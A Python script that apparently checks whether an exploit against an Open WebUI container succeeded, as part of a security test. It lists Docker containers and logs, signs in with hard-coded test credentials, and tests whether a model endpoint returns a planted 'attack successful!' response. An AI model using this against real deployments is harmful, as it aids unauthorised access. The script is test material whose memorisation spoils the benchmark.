# from flask import jsonify
import requests
import json
import subprocess

def list_running_containers():
    print("Running containers:")
    subprocess.run(["docker", "ps"])

def fetch_open_webui_logs():
    print("open-webui logs:")
    subprocess.run(["docker", "logs", "open-webui"])

list_running_containers()
fetch_open_webui_logs()

RESPONSE_BODY = {"success": True, "message": "attack successful!"}

APPLICATION_URL = "http://open-webui:8080"

WEBUI_API_BASE_URL = APPLICATION_URL + "/api/v1"

def user_sign_in(email: str, password: str):
    error = None
    url = f"{WEBUI_API_BASE_URL}/auths/signin"

    try:
        response = requests.post(
            url,
            headers={"Content-Type": "application/json"},
            data=json.dumps({"email": email, "password": password}),
        )
        if response.status_code != 200:
            raise response.json()
        
        # Extract response JSON and token from cookies
        res = response.json()
        token = response.cookies.get('token')  # Adjust 'token' if your server uses a different key
        if not token:
            raise Exception("Token not found in cookies.")

        res['token'] = token  # Add token to the response for convenience

    except Exception as err:
        print(err)
        error = getattr(err, "detail", str(err))
        res = None

    if error:
        raise Exception(error)

    return res


# Perform user sign-in and retrieve token
try:
    user_info = user_sign_in("test@test.com", "test")
    token = user_info['token']
except Exception as e:
    print(f"Sign in failed: {str(e)}")
    exit(1)

# Use the token in subsequent requests
cookies = {
    'token': token,  # Use the token retrieved from the sign-in response
}

headers = {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
}

# Make the GET request to fetch model data
response = requests.get(APPLICATION_URL + '/openai/models/0', cookies=cookies, headers=headers)
print("Model Data Response:")
print(response.text)
res = response.json()
try:
    if res["message"] == RESPONSE_BODY["message"] and res["success"] == RESPONSE_BODY["success"]:
        print("Exploit successful!")
        exit(0)
    else:
        print("Exploit failed!")
        exit(1)
except Exception as e:
    print("Exploit failed!")
    print(e)
    exit(1)
